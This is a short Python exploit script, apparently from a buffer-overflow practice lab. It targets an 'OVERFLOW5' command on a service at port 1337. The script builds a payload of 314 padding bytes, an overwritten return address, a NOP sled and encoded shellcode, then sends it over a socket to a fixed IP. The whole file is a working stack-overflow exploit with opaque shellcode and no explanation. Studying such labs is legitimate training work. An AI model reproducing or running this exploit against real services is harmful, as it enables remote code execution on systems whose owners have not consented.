#!/usr/bin/env python3

import socket, sys


'''
Getting offset 
'''


ip = "10.10.42.175"
port = 1337

prefix = b"OVERFLOW5 "
offset = 314
overflow = b"A" * offset
retn = b"\x05\x12\x50\x62"
padding = b"\x90"*16      # used for giving some space to unpack encoding(in this case, shikataganai)

shellcode = b"\xfc\xbb\x75\x8e\xb9\xfc\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x89\x66\x3b\xfc\x71\x77\x5c\x74\x94\x46\x5c\xe2\xdd\xf9\x6c\x60\xb3\xf5\x07\x24\x27\x8d\x6a\xe1\x48\x26\xc0\xd7\x67\xb7\x79\x2b\xe6\x3b\x80\x78\xc8\x02\x4b\x8d\x09\x42\xb6\x7c\x5b\x1b\xbc\xd3\x4b\x28\x88\xef\xe0\x62\x1c\x68\x15\x32\x1f\x59\x88\x48\x46\x79\x2b\x9c\xf2\x30\x33\xc1\x3f\x8a\xc8\x31\xcb\x0d\x18\x08\x34\xa1\x65\xa4\xc7\xbb\xa2\x03\x38\xce\xda\x77\xc5\xc9\x19\x05\x11\x5f\xb9\xad\xd2\xc7\x65\x4f\x36\x91\xee\x43\xf3\xd5\xa8\x47\x02\x39\xc3\x7c\x8f\xbc\x03\xf5\xcb\x9a\x87\x5d\x8f\x83\x9e\x3b\x7e\xbb\xc0\xe3\xdf\x19\x8b\x0e\x0b\x10\xd6\x46\xf8\x19\xe8\x96\x96\x2a\x9b\xa4\x39\x81\x33\x85\xb2\x0f\xc4\xea\xe8\xe8\x5a\x15\x13\x09\x73\xd2\x47\x59\xeb\xf3\xe7\x32\xeb\xfc\x3d\x94\xbb\x52\xee\x55\x6b\x13\x5e\x3e\x61\x9c\x81\x5e\x8a\x76\xaa\xf5\x71\x11\xdf\x01\x09\x1c\xb7\x13\xe9\xcf\x14\x9d\x0f\x85\xb4\xcb\x98\x32\x2c\x56\x52\xa2\xb1\x4c\x1f\xe4\x3a\x63\xe0\xab\xca\x0e\xf2\x5c\x3b\x45\xa8\xcb\x44\x73\xc4\x90\xd7\x18\x14\xde\xcb\xb6\x43\xb7\x3a\xcf\x01\x25\x64\x79\x37\xb4\xf0\x42\xf3\x63\xc1\x4d\xfa\xe6\x7d\x6a\xec\x3e\x7d\x36\x58\xef\x28\xe0\x36\x49\x83\x42\xe0\x03\x78\x0d\x64\xd5\xb2\x8e\xf2\xda\x9e\x78\x1a\x6a\x77\x3d\x25\x43\x1f\xc9\x5e\xb9\xbf\x36\xb5\x79\xdf\xd4\x1f\x74\x48\x41\xca\x35\x15\x72\x21\x79\x20\xf1\xc3\x02\xd7\xe9\xa6\x07\x93\xad\x5b\x7a\x8c\x5b\x5b\x29\xad\x49\x5b\xcd\x51\x72"


#postfix = b""

payload = prefix + overflow + retn + padding + shellcode     #Add NOPs \x90

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print("Sending payload...")
    #s.recv(1024)
    s.send(payload + b'\r\n')
    #s.recv(1024)
    print("Done!")
    s.close

except:
    print("Cannot connect to server")
    sys.exit()
